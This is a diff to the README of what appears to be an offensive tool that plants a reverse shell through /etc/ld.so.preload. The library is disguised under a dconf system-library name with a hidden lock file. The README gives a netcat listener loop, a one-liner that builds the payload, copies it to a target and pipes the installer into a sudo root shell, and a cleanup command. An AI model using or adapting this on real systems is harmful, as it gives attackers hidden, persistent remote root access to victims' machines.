@@ -6,13 +6,12 @@ Implements rate limited reverse shell via dynamic linker
 - ld_install.sh: Ran on the target to handle pathing, permissions, and integrity checks
 - libdconf-update.so: Compiled payload
 
-## Build + Listen:
-- bash ld_gen.sh
-- nc -lvnp 4444
+## Listener:
+- while true; do nc -lvnp 4444; done
 
-## Deploy (One liner)
+## Deploy From ld_preload Directory (One liner)
 - Uploads the binary and pipes the installer script directly into a remote root shell
-    - scp libdconf-update.so target@<IP>:/tmp/ && ssh -t target@<IP> "sudo bash -s" < ld_install.sh
+    - bash ld_gen.sh && scp libdconf-update.so <target_user>@<target_ip>:/tmp/ && ssh -t <target_user>@<target_ip> "sudo bash -s" < ld_install.sh
 
 ## Cleanup (From host)
-- ssh -t target@<IP> "sudo sed -i '\|/usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99|d' /etc/ld.so.preload && sudo rm -f /usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99 /var/tmp/.dconf-lock"
+- ssh -t <target_user>@<target_ip> "sudo sed -i '\|/usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99|d' /etc/ld.so.preload && sudo rm -f /usr/lib/x86_64-linux-gnu/libdconf-1.so.0.99 /var/tmp/.dconf-lock"
